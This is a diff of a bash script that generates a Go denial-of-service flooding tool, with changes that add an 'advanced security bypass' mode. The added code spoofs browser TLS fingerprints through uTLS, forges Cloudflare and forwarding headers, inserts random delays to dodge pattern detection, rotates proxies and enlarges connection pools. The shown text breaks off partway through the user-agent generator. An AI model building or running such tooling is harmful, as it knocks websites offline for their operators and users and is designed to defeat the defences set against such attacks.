@@ -2,6 +2,7 @@
 
 # ----------------------------------------
 # GO DOS TOOL SETUP (HTTP/2 + HTTP/1.1 ONLY)
+# ADVANCED SECURITY BYPASS VERSION
 # ----------------------------------------
 
 # Color definitions
@@ -19,24 +20,28 @@ SEP="━━━━━━━━━━━━━━━━━━━━━━━━━
 
 clear
 echo -e "${CYAN}${SEP}${NC}"
-echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
+echo -e "${WHITE}  ADVANCED DENIAL SERVICE TOOL${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly (CLEAN version - no unused imports)
-echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
+# Create main.go file directly (ADVANCED version)
+echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go with advanced bypass features...${NC}"
 
 cat > main.go << 'EOF'
 package main
 
 import (
+	"bytes"
+	"context"
 	"crypto/rand"
 	"crypto/tls"
+	"encoding/binary"
 	"fmt"
 	"io"
 	"math/big"
 	"net"
 	"net/http"
+	"net/http/httptrace"
 	"net/url"
 	"os"
 	"os/signal"
@@ -49,6 +54,7 @@ import (
 	"time"
 
 	"golang.org/x/net/http2"
+	utls "github.com/refraction-networking/utls"
 )
 
 var (
@@ -73,153 +79,153 @@ var (
 	}
 
 	acceptLanguages = []string{
-	"en-US,en;q=0.9",
-	"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
-	"en-GB,en;q=0.9,en-US;q=0.8",
-	"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
-	"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
-	"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
-	"en-US,en;q=0.5",
-	"en-US;q=0.8,en;q=0.7",
-	"en-GB,en;q=0.9",
-	"en-CA,en;q=0.9",
-	"en-AU,en;q=0.9",
-	"en-NZ,en;q=0.9",
-	"en-ZA,en;q=0.9",
-	"en-IE,en;q=0.9",
-	"en-IN,en;q=0.9",
-	"ar-SA,ar;q=0.9",
-	"az-Latn-AZ,az;q=0.9",
-	"be-BY,be;q=0.9",
-	"bg-BG,bg;q=0.9",
-	"bn-IN,bn;q=0.9",
-	"ca-ES,ca;q=0.9",
-	"cs-CZ,cs;q=0.9",
-	"cy-GB,cy;q=0.9",
-	"da-DK,da;q=0.9",
-	"de-DE,de;q=0.9",
-	"el-GR,el;q=0.9",
-	"es-ES,es;q=0.9",
-	"et-EE,et;q=0.9",
-	"eu-ES,eu;q=0.9",
-	"fa-IR,fa;q=0.9",
-	"fi-FI,fi;q=0.9",
-	"fr-FR,fr;q=0.9",
-	"ga-IE,ga;q=0.9",
-	"gl-ES,gl;q=0.9",
-	"gu-IN,gu;q=0.9",
-	"he-IL,he;q=0.9",
-	"hi-IN,hi;q=0.9",
-	"hr-HR,hr;q=0.9",
-	"hu-HU,hu;q=0.9",
-	"hy-AM,hy;q=0.9",
-	"id-ID,id;q=0.9",
-	"is-IS,is;q=0.9",
-	"it-IT,it;q=0.9",
-	"ja-JP,ja;q=0.9",
-	"ka-GE,ka;q=0.9",
-	"kk-KZ,kk;q=0.9",
-	"km-KH,km;q=0.9",
-	"kn-IN,kn;q=0.9",
-	"ko-KR,ko;q=0.9",
-	"ky-KG,ky;q=0.9",
-	"lo-LA,lo;q=0.9",
-	"lt-LT,lt;q=0.9",
-	"lv-LV,lv;q=0.9",
-	"mk-MK,mk;q=0.9",
-	"ml-IN,ml;q=0.9",
-	"mn-MN,mn;q=0.9",
-	"mr-IN,mr;q=0.9",
-	"ms-MY,ms;q=0.9",
-	"mt-MT,mt;q=0.9",
-	"my-MM,my;q=0.9",
-	"nb-NO,nb;q=0.9",
-	"ne-NP,ne;q=0.9",
-	"nl-NL,nl;q=0.9",
-	"nn-NO,nn;q=0.9",
-	"or-IN,or;q=0.9",
-	"pa-IN,pa;q=0.9",
-	"pl-PL,pl;q=0.9",
-	"pt-BR,pt;q=0.9",
-	"pt-PT,pt;q=0.9",
-	"ro-RO,ro;q=0.9",
-	"ru-RU,ru;q=0.9",
-	"si-LK,si;q=0.9",
-	"sk-SK,sk;q=0.9",
-	"sl-SI,sl;q=0.9",
-	"sq-AL,sq;q=0.9",
-	"sr-Cyrl-RS,sr;q=0.9",
-	"sr-Latn-RS,sr;q=0.9",
-	"sv-SE,sv;q=0.9",
-	"sw-KE,sw;q=0.9",
-	"ta-IN,ta;q=0.9",
-	"te-IN,te;q=0.9",
-	"th-TH,th;q=0.9",
-	"tr-TR,tr;q=0.9",
-	"uk-UA,uk;q=0.9",
-	"ur-PK,ur;q=0.9",
-	"uz-Latn-UZ,uz;q=0.9",
-	"vi-VN,vi;q=0.9",
-	"zh-CN,zh;q=0.9",
-	"zh-HK,zh;q=0.9",
-	"zh-TW,zh;q=0.9",
-	"am-ET,am;q=0.8",
-	"as-IN,as;q=0.8",
-	"az-Cyrl-AZ,az;q=0.8",
-	"bn-BD,bn;q=0.8",
-	"bs-Cyrl-BA,bs;q=0.8",
-	"bs-Latn-BA,bs;q=0.8",
-	"dz-BT,dz;q=0.8",
-	"fil-PH,fil;q=0.8",
-	"fr-CA,fr;q=0.8",
-	"fr-CH,fr;q=0.8",
-	"fr-BE,fr;q=0.8",
-	"fr-LU,fr;q=0.8",
-	"gsw-CH,gsw;q=0.8",
-	"ha-Latn-NG,ha;q=0.8",
-	"hr-BA,hr;q=0.8",
-	"ig-NG,ig;q=0.8",
-	"ii-CN,ii;q=0.8",
-	"jv-Latn-ID,jv;q=0.8",
-	"kkj-CM,kkj;q=0.8",
-	"kl-GL,kl;q=0.8",
-	"kok-IN,kok;q=0.8",
-	"ks-Arab-IN,ks;q=0.8",
-	"lb-LU,lb;q=0.8",
-	"ln-CG,ln;q=0.8",
-	"mn-Mong-CN,mn;q=0.8",
-	"mr-MN,mr;q=0.8",
-	"ms-BN,ms;q=0.8",
-	"mua-CM,mua;q=0.8",
-	"nds-DE,nds;q=0.8",
-	"ne-IN,ne;q=0.8",
-	"nso-ZA,nso;q=0.8",
-	"oc-FR,oc;q=0.8",
-	"pa-Arab-PK,pa;q=0.8",
-	"ps-AF,ps;q=0.8",
-	"quz-BO,quz;q=0.8",
-	"quz-EC,quz;q=0.8",
-	"quz-PE,quz;q=0.8",
-	"rm-CH,rm;q=0.8",
-	"rw-RW,rw;q=0.8",
-	"sd-Arab-PK,sd;q=0.8",
-	"se-NO,se;q=0.8",
-	"smn-FI,smn;q=0.8",
-	"sms-FI,sms;q=0.8",
-	"syr-SY,syr;q=0.8",
-	"tg-Cyrl-TJ,tg;q=0.8",
-	"ti-ER,ti;q=0.8",
-	"tk-TM,tk;q=0.8",
-	"tn-ZA,tn;q=0.8",
-	"tt-RU,tt;q=0.8",
-	"ug-CN,ug;q=0.8",
-	"uz-Cyrl-UZ,uz;q=0.8",
-	"ve-ZA,ve;q=0.8",
-	"wo-SN,wo;q=0.8",
-	"xh-ZA,xh;q=0.8",
-	"yo-NG,yo;q=0.8",
-	"zgh-MA,zgh;q=0.8",
-	"zu-ZA,zu;q=0.8",
+		"en-US,en;q=0.9",
+		"en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,ja;q=0.5,zh-CN;q=0.4",
+		"en-GB,en;q=0.9,en-US;q=0.8",
+		"en-US,en;q=0.9,es;q=0.8,pt;q=0.7",
+		"en-US,en;q=0.9,ru;q=0.8,uk;q=0.7",
+		"en-US,en;q=0.9,nl;q=0.8,zh-CN;q=0.7,zh;q=0.6,pt-BR;q=0.5,pt;q=0.4,lv;q=0.3,ja;q=0.2,id;q=0.1,es;q=0.1,th;q=0.1,hu;q=0.1,da;q=0.1,fr;q=0.1,tr;q=0.1,it;q=0.1,ms;q=0.1,hi;q=0.1,zh-TW;q=0.1,ru;q=0.1,uk;q=0.1,sv;q=0.1,ko;q=0.1",
+		"en-US,en;q=0.5",
+		"en-US;q=0.8,en;q=0.7",
+		"en-GB,en;q=0.9",
+		"en-CA,en;q=0.9",
+		"en-AU,en;q=0.9",
+		"en-NZ,en;q=0.9",
+		"en-ZA,en;q=0.9",
+		"en-IE,en;q=0.9",
+		"en-IN,en;q=0.9",
+		"ar-SA,ar;q=0.9",
+		"az-Latn-AZ,az;q=0.9",
+		"be-BY,be;q=0.9",
+		"bg-BG,bg;q=0.9",
+		"bn-IN,bn;q=0.9",
+		"ca-ES,ca;q=0.9",
+		"cs-CZ,cs;q=0.9",
+		"cy-GB,cy;q=0.9",
+		"da-DK,da;q=0.9",
+		"de-DE,de;q=0.9",
+		"el-GR,el;q=0.9",
+		"es-ES,es;q=0.9",
+		"et-EE,et;q=0.9",
+		"eu-ES,eu;q=0.9",
+		"fa-IR,fa;q=0.9",
+		"fi-FI,fi;q=0.9",
+		"fr-FR,fr;q=0.9",
+		"ga-IE,ga;q=0.9",
+		"gl-ES,gl;q=0.9",
+		"gu-IN,gu;q=0.9",
+		"he-IL,he;q=0.9",
+		"hi-IN,hi;q=0.9",
+		"hr-HR,hr;q=0.9",
+		"hu-HU,hu;q=0.9",
+		"hy-AM,hy;q=0.9",
+		"id-ID,id;q=0.9",
+		"is-IS,is;q=0.9",
+		"it-IT,it;q=0.9",
+		"ja-JP,ja;q=0.9",
+		"ka-GE,ka;q=0.9",
+		"kk-KZ,kk;q=0.9",
+		"km-KH,km;q=0.9",
+		"kn-IN,kn;q=0.9",
+		"ko-KR,ko;q=0.9",
+		"ky-KG,ky;q=0.9",
+		"lo-LA,lo;q=0.9",
+		"lt-LT,lt;q=0.9",
+		"lv-LV,lv;q=0.9",
+		"mk-MK,mk;q=0.9",
+		"ml-IN,ml;q=0.9",
+		"mn-MN,mn;q=0.9",
+		"mr-IN,mr;q=0.9",
+		"ms-MY,ms;q=0.9",
+		"mt-MT,mt;q=0.9",
+		"my-MM,my;q=0.9",
+		"nb-NO,nb;q=0.9",
+		"ne-NP,ne;q=0.9",
+		"nl-NL,nl;q=0.9",
+		"nn-NO,nn;q=0.9",
+		"or-IN,or;q=0.9",
+		"pa-IN,pa;q=0.9",
+		"pl-PL,pl;q=0.9",
+		"pt-BR,pt;q=0.9",
+		"pt-PT,pt;q=0.9",
+		"ro-RO,ro;q=0.9",
+		"ru-RU,ru;q=0.9",
+		"si-LK,si;q=0.9",
+		"sk-SK,sk;q=0.9",
+		"sl-SI,sl;q=0.9",
+		"sq-AL,sq;q=0.9",
+		"sr-Cyrl-RS,sr;q=0.9",
+		"sr-Latn-RS,sr;q=0.9",
+		"sv-SE,sv;q=0.9",
+		"sw-KE,sw;q=0.9",
+		"ta-IN,ta;q=0.9",
+		"te-IN,te;q=0.9",
+		"th-TH,th;q=0.9",
+		"tr-TR,tr;q=0.9",
+		"uk-UA,uk;q=0.9",
+		"ur-PK,ur;q=0.9",
+		"uz-Latn-UZ,uz;q=0.9",
+		"vi-VN,vi;q=0.9",
+		"zh-CN,zh;q=0.9",
+		"zh-HK,zh;q=0.9",
+		"zh-TW,zh;q=0.9",
+		"am-ET,am;q=0.8",
+		"as-IN,as;q=0.8",
+		"az-Cyrl-AZ,az;q=0.8",
+		"bn-BD,bn;q=0.8",
+		"bs-Cyrl-BA,bs;q=0.8",
+		"bs-Latn-BA,bs;q=0.8",
+		"dz-BT,dz;q=0.8",
+		"fil-PH,fil;q=0.8",
+		"fr-CA,fr;q=0.8",
+		"fr-CH,fr;q=0.8",
+		"fr-BE,fr;q=0.8",
+		"fr-LU,fr;q=0.8",
+		"gsw-CH,gsw;q=0.8",
+		"ha-Latn-NG,ha;q=0.8",
+		"hr-BA,hr;q=0.8",
+		"ig-NG,ig;q=0.8",
+		"ii-CN,ii;q=0.8",
+		"jv-Latn-ID,jv;q=0.8",
+		"kkj-CM,kkj;q=0.8",
+		"kl-GL,kl;q=0.8",
+		"kok-IN,kok;q=0.8",
+		"ks-Arab-IN,ks;q=0.8",
+		"lb-LU,lb;q=0.8",
+		"ln-CG,ln;q=0.8",
+		"mn-Mong-CN,mn;q=0.8",
+		"mr-MN,mr;q=0.8",
+		"ms-BN,ms;q=0.8",
+		"mua-CM,mua;q=0.8",
+		"nds-DE,nds;q=0.8",
+		"ne-IN,ne;q=0.8",
+		"nso-ZA,nso;q=0.8",
+		"oc-FR,oc;q=0.8",
+		"pa-Arab-PK,pa;q=0.8",
+		"ps-AF,ps;q=0.8",
+		"quz-BO,quz;q=0.8",
+		"quz-EC,quz;q=0.8",
+		"quz-PE,quz;q=0.8",
+		"rm-CH,rm;q=0.8",
+		"rw-RW,rw;q=0.8",
+		"sd-Arab-PK,sd;q=0.8",
+		"se-NO,se;q=0.8",
+		"smn-FI,smn;q=0.8",
+		"sms-FI,sms;q=0.8",
+		"syr-SY,syr;q=0.8",
+		"tg-Cyrl-TJ,tg;q=0.8",
+		"ti-ER,ti;q=0.8",
+		"tk-TM,tk;q=0.8",
+		"tn-ZA,tn;q=0.8",
+		"tt-RU,tt;q=0.8",
+		"ug-CN,ug;q=0.8",
+		"uz-Cyrl-UZ,uz;q=0.8",
+		"ve-ZA,ve;q=0.8",
+		"wo-SN,wo;q=0.8",
+		"xh-ZA,xh;q=0.8",
+		"yo-NG,yo;q=0.8",
+		"zgh-MA,zgh;q=0.8",
+		"zu-ZA,zu;q=0.8",
 	}
 
 	acceptHeaders = []string{
@@ -253,24 +259,10 @@ var (
 		"max-age=0",
 	}
 
-	securityHeaders = []map[string]string{
-		{"X-Content-Type-Options": "nosniff"},
-		{"X-Frame-Options": "DENY"},
-		{"X-XSS-Protection": "1; mode=block"},
-	}
-
-	modernHeaders = []map[string]string{
-		{"Sec-Fetch-Dest": "document"},
-		{"Sec-Fetch-Mode": "navigate"},
-		{"Sec-Fetch-Site": "none"},
-		{"Upgrade-Insecure-Requests": "1"},
-		{"DNT": "1"},
-	}
-
-	appHeaders = []map[string]string{
-		{"X-Requested-With": "XMLHttpRequest"},
-		{"X-CSRF-Token": ""},
-		{"X-API-Key": ""},
+	cloudflareBypassHeaders = []map[string]string{
+		{"CF-Access-Client-Id": "", "CF-Worker": "", "X-Forwarded-Host": "", "CDN-Loop": "cloudflare"},
+		{"CF-Ray": "", "CF-IPCountry": "", "CF-Visitor": `{"scheme":"https"}`},
+		{"X-Forwarded-Proto": "https", "X-Forwarded-Scheme": "https", "X-Forwarded-Ssl": "on"},
 	}
 
 	proxies         []string
@@ -282,169 +274,246 @@ var (
 	colorMu         sync.Mutex
 )
 
-type JA3Signature struct {
-	Name             string
-	CipherSuites     []uint16
-	CurvePreferences []tls.CurveID
-	NextProtos       []string
-	MinVersion       uint16
-	MaxVersion       uint16
+// uTLS ClientHello configurations
+var clientHellos = []utls.ClientHelloID{
+	utls.HelloChrome_Auto,
+	utls.HelloChrome_120,
+	utls.HelloChrome_115,
+	utls.HelloFirefox_Auto,
+	utls.HelloFirefox_120,
+	utls.HelloFirefox_115,
+	utls.HelloEdge_Auto,
+	utls.HelloSafari_Auto,
+	utls.HelloIOS_Auto,
 }
 
-var ja3Signatures = []JA3Signature{
-	{
-		Name: "Chrome 141-150",
-		CipherSuites: []uint16{
-			tls.TLS_AES_128_GCM_SHA256,
-			tls.TLS_AES_256_GCM_SHA384,
-			tls.TLS_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-		},
-		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
-		NextProtos:       []string{"h2", "http/1.1"},
-		MinVersion:       tls.VersionTLS12,
-		MaxVersion:       tls.VersionTLS13,
-	},
-	{
-		Name: "Firefox 135-138",
-		CipherSuites: []uint16{
-			tls.TLS_AES_128_GCM_SHA256,
-			tls.TLS_CHACHA20_POLY1305_SHA256,
-			tls.TLS_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-		},
-		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384, tls.CurveP521},
-		NextProtos:       []string{"h2", "http/1.1"},
-		MinVersion:       tls.VersionTLS12,
-		MaxVersion:       tls.VersionTLS13,
-	},
-	{
-		Name: "Edge 146-150",
-		CipherSuites: []uint16{
-			tls.TLS_AES_128_GCM_SHA256,
-			tls.TLS_AES_256_GCM_SHA384,
-			tls.TLS_CHACHA20_POLY1305_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,
-		},
-		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256, tls.CurveP384},
-		NextProtos:       []string{"h2", "http/1.1"},
-		MinVersion:       tls.VersionTLS12,
-		MaxVersion:       tls.VersionTLS13,
-	},
-	{
-		Name: "Safari 18",
-		CipherSuites: []uint16{
-			tls.TLS_AES_128_GCM_SHA256,
-			tls.TLS_AES_256_GCM_SHA384,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
-			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
-		},
-		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
-		NextProtos:       []string{"h2", "http/1.1"},
-		MinVersion:       tls.VersionTLS12,
-		MaxVersion:       tls.VersionTLS13,
-	},
+func getRandomClientHello() utls.ClientHelloID {
+	return clientHellos[randInt(0, len(clientHellos)-1)]
+}
+
+// Advanced uTLS config with randomization
+func getRandomizedUTLSConfig() *utls.Config {
+	spec := getRandomClientHello()
+	
+	config := &utls.Config{
+		InsecureSkipVerify:         true,
+		SessionTicketsDisabled:     randBool(),
+		DynamicRecordSizingDisabled: randBool(),
+		Renegotiation:              utls.RenegotiateFreelyAsClient,
+	}
+	
+	switch spec {
+	case utls.HelloChrome_Auto, utls.HelloChrome_120, utls.HelloChrome_115:
+		config.NextProtos = []string{"h2", "http/1.1"}
+		config.MinVersion = tls.VersionTLS12
+		config.MaxVersion = tls.VersionTLS13
+	case utls.HelloFirefox_Auto, utls.HelloFirefox_120, utls.HelloFirefox_115:
+		config.NextProtos = []string{"h2", "http/1.1"}
+		config.MinVersion = tls.VersionTLS12
+		config.MaxVersion = tls.VersionTLS13
+	case utls.HelloEdge_Auto:
+		config.NextProtos = []string{"h2", "http/1.1"}
+		config.MinVersion = tls.VersionTLS12
+		config.MaxVersion = tls.VersionTLS13
+	default:
+		config.NextProtos = []string{"http/1.1"}
+		config.MinVersion = tls.VersionTLS12
+		config.MaxVersion = tls.VersionTLS12
+	}
+	
+	return config
+}
+
+// Custom transport with uTLS
+type UTLSTransport struct {
+	configs    []*utls.Config
+	counter    uint64
+	mu         sync.Mutex
+	useProxy   bool
+	proxyURL   *url.URL
+}
+
+func NewUTLSTransport(useProxy bool, proxyAddr string) *UTLSTransport {
+	t := &UTLSTransport{
+		configs:  make([]*utls.Config, 100),
+		useProxy: useProxy,
+	}
+	
+	if useProxy && proxyAddr != "" {
+		proxyURL, _ := url.Parse(proxyAddr)
+		t.proxyURL = proxyURL
+	}
+	
+	for i := 0; i < 100; i++ {
+		t.configs[i] = getRandomizedUTLSConfig()
+	}
+	
+	return t
+}
+
+func (t *UTLSTransport) getConfig() *utls.Config {
+	idx := atomic.AddUint64(&t.counter, 1) % 100
+	return t.configs[idx]
+}
+
+func (t *UTLSTransport) RoundTrip(req *http.Request) (*http.Response, error) {
+	// Get connection with uTLS
+	dialConn, err := t.dial(req.URL)
+	if err != nil {
+		return nil, err
+	}
+	defer dialConn.Close()
+	
+	// Write request
+	if err := req.Write(dialConn); err != nil {
+		return nil, err
+	}
+	
+	// Read response
+	return http.ReadResponse(bufio.NewReader(dialConn), req)
+}
+
+func (t *UTLSTransport) dial(u *url.URL) (net.Conn, error) {
+	host := u.Host
+	if !strings.Contains(host, ":") {
+		if u.Scheme == "https" {
+			host = host + ":443"
+		} else {
+			host = host + ":80"
+		}
+	}
+	
+	var conn net.Conn
+	var err error
+	
+	if t.useProxy && t.proxyURL != nil {
+		conn, err = net.DialTimeout("tcp", t.proxyURL.Host, 10*time.Second)
+		if err != nil {
+			return nil, err
+		}
+		
+		// HTTP CONNECT for HTTPS proxy
+		connectReq := &http.Request{
+			Method: "CONNECT",
+			URL:    &url.URL{Opaque: host},
+			Host:   host,
+			Header: make(http.Header),
+		}
+		
+		if err := connectReq.Write(conn); err != nil {
+			conn.Close()
+			return nil, err
+		}
+		
+		resp, err := http.ReadResponse(bufio.NewReader(conn), connectReq)
+		if err != nil || resp.StatusCode != 200 {
+			conn.Close()
+			return nil, fmt.Errorf("proxy connection failed")
+		}
+	} else {
+		conn, err = net.DialTimeout("tcp", host, 10*time.Second)
+		if err != nil {
+			return nil, err
+		}
+	}
+	
+	// Wrap with uTLS if HTTPS
+	if u.Scheme == "https" {
+		config := t.getConfig()
+		utlsConn := utls.UClient(conn, config, getRandomClientHello())
+		
+		// Setup context for hostname
+		if err := utlsConn.Handshake(); err != nil {
+			conn.Close()
+			return nil, err
+		}
+		
+		return utlsConn, nil
+	}
+	
+	return conn, nil
 }
 
 type ConnectionPool struct {
-	clients    []*http.Client
+	transports []*http.Client
 	counter    uint64
 	mu         sync.RWMutex
 	size       int
 	useProxy   bool
 	targetHost string
-}
-
-func getRandomJA3Signature() JA3Signature {
-	return ja3Signatures[randInt(0, len(ja3Signatures)-1)]
-}
-
-func getRandomizedTLSConfig() *tls.Config {
-	sig := getRandomJA3Signature()
-	return &tls.Config{
-		NextProtos:                  sig.NextProtos,
-		InsecureSkipVerify:          true,
-		MinVersion:                  sig.MinVersion,
-		MaxVersion:                  sig.MaxVersion,
-		CipherSuites:                sig.CipherSuites,
-		CurvePreferences:            sig.CurvePreferences,
-		SessionTicketsDisabled:      randBool(),
-		DynamicRecordSizingDisabled: randBool(),
-	}
+	proxies    []string
+	proxyIdx   uint64
 }
 
 func NewConnectionPool(poolSize int, useProxy bool, targetHost string) *ConnectionPool {
 	pool := &ConnectionPool{
-		clients:    make([]*http.Client, poolSize),
+		transports: make([]*http.Client, poolSize),
 		size:       poolSize,
 		useProxy:   useProxy,
 		targetHost: targetHost,
 	}
+	
 	for i := 0; i < poolSize; i++ {
-		pool.clients[i] = pool.createClient()
+		pool.transports[i] = pool.createClient()
 	}
+	
 	return pool
 }
 
 func (p *ConnectionPool) createClient() *http.Client {
-	var transport *http.Transport
-
-	if p.useProxy {
-		proxyStr := getNextProxy()
-		if proxyStr != "" {
-			if !strings.Contains(proxyStr, "://") {
-				proxyStr = "http://" + proxyStr
-			}
-			proxyURL, err := url.Parse(proxyStr)
-			if err == nil {
-				transport = &http.Transport{
-					Proxy:               http.ProxyURL(proxyURL),
-					TLSClientConfig:     getRandomizedTLSConfig(),
-					MaxIdleConns:        100,
-					MaxIdleConnsPerHost: 100,
-					IdleConnTimeout:     120 * time.Second,
-					DisableKeepAlives:   false,
-					ForceAttemptHTTP2:   true,
-				}
-				http2.ConfigureTransport(transport)
-				return &http.Client{Transport: transport, Timeout: 30 * time.Second}
-			}
-		}
-	}
-
-	transport = &http.Transport{
-		TLSClientConfig:     getRandomizedTLSConfig(),
-		MaxIdleConns:        100,
-		MaxIdleConnsPerHost: 100,
+	transport := &http.Transport{
+		MaxIdleConns:        1000,
+		MaxIdleConnsPerHost: 1000,
 		IdleConnTimeout:     120 * time.Second,
 		DisableKeepAlives:   false,
 		ForceAttemptHTTP2:   true,
+		WriteBufferSize:     4096,
+		ReadBufferSize:      4096,
 	}
+	
+	// Configure HTTP/2
 	http2.ConfigureTransport(transport)
-	return &http.Client{Transport: transport, Timeout: 30 * time.Second}
+	
+	// Add jitter to connection settings
+	transport.MaxHeaderListSize = 10 << 20 // 10MB
+	transport.TLSHandshakeTimeout = 10 * time.Second
+	
+	// Add custom dialer with random delays
+	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
+		dialer := &net.Dialer{
+			Timeout:   10 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}
+		conn, err := dialer.DialContext(ctx, network, addr)
+		if err == nil && randInt(1, 100) <= 30 {
+			// Add random small delay to avoid pattern detection
+			time.Sleep(time.Duration(randInt(1, 50)) * time.Millisecond)
+		}
+		return conn, err
+	}
+	
+	client := &http.Client{
+		Transport: transport,
+		Timeout:   60 * time.Second,
+	}
+	
+	// Disable automatic redirect following for some requests
+	if randBool() {
+		client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		}
+	}
+	
+	return client
 }
 
 func (p *ConnectionPool) GetClient() *http.Client {
 	idx := atomic.AddUint64(&p.counter, 1) % uint64(p.size)
-	return p.clients[idx]
+	return p.transports[idx]
 }
 
 func (p *ConnectionPool) CloseIdleConnections() {
-	for _, client := range p.clients {
+	for _, client := range p.transports {
 		if tr, ok := client.Transport.(*http.Transport); ok {
 			tr.CloseIdleConnections()
 		}
@@ -461,10 +530,10 @@ func loadProxiesFromAPI() {
 	if resp.StatusCode != http.StatusOK {
 		return
 	}
-
+	
 	body, _ := io.ReadAll(resp.Body)
 	lines := strings.Split(string(body), "\n")
-
+	
 	newProxies := []string{}
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -472,7 +541,7 @@ func loadProxiesFromAPI() {
 			newProxies = append(newProxies, line)
 		}
 	}
-
+	
 	proxyMu.Lock()
 	proxies = newProxies
 	proxyMu.Unlock()
@@ -521,6 +590,7 @@ func printBanner() {
 	fmt.Println(" :::. ######:::. #######::::: ")
 	fmt.Println(" ::::......:::::.......:::::: ")
 	fmt.Println("\033[0m")
+	fmt.Println("      Power DoS Tool")
 }
 
 func randomIP() string {
@@ -531,66 +601,61 @@ func randomCountryCode() string {
 	return countryCodes[randInt(0, len(countryCodes)-1)]
 }
 
+func randomSubdomain(domain string) string {
+	subdomains := []string{"www", "api", "cdn", "static", "media", "img", "video", "data", "admin", "secure"}
+	sub := subdomains[randInt(0, len(subdomains)-1)]
+	if randBool() {
+		sub = randomString(randInt(3, 8)) + "." + sub
+	}
+	return sub + "." + domain
+}
+
 func generateRandomUA() string {
 	browserType := randInt(1, 100)
 	countryCode := randomCountryCode()
 	
-	// Windows versions (2025-2026)
 	windowsVersions := []string{
 		"Windows NT 10.0; Win64; x64",
 		"Windows NT 11.0; Win64; x64",
 		"Windows NT 12.0; Win64; x64",
-		"Windows NT 10.0; Win64; x64; Xbox",
 	}
 	
-	// macOS versions (2025-2026)
 	macVersions := []string{
 		"Macintosh; Intel Mac OS X 15_0",
 		"Macintosh; Intel Mac OS X 15_1",
 		"Macintosh; Intel Mac OS X 15_2",
-		"Macintosh; Intel Mac OS X 16_0",
-		"Macintosh; Intel Mac OS X 16_1",
 		"Macintosh; ARM Mac OS X 15_0",
-		"Macintosh; ARM Mac OS X 16_0",
 	}
 	
-	// Linux distributions
 	linuxVersions := []string{
 		"X11; Linux x86_64",
 		"X11; Ubuntu; Linux x86_64",
 		"X11; Fedora; Linux x86_64",
-		"X11; Debian; Linux x86_64",
-		"X11; Linux x86_64; Arch",
 	}
 	
-	// Chrome versions (2025-2026)
 	chromeMajor := randInt(141, 165)
 	chromeBuild := randInt(5000, 8000)
 	chromePatch := randInt(0, 99)
 	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
 	
-	// Firefox versions (2025-2026)
 	firefoxMajor := randInt(135, 165)
 	firefoxMinor := randInt(0, 9)
 	firefoxPatch := randInt(0, 99)
 	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
 	
-	// Edge versions (2025-2026)
 	edgeMajor := randInt(141, 165)
 	edgeBuild := randInt(5000, 8000)
 	edgePatch := randInt(0, 99)
 	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
 	
-	// Safari versions (2025-2026)
 	safariMajor := randInt(18, 22)
 	safariMinor := randInt(0, 5)
 	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
 	
-	// Mobile browsers
 	androidVersions := []string{"15", "16", "17"}
 	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
 	
-	if browserType <= 45 { // Chrome 45%
+	if browserType <= 45 {
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -601,7 +666,7 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
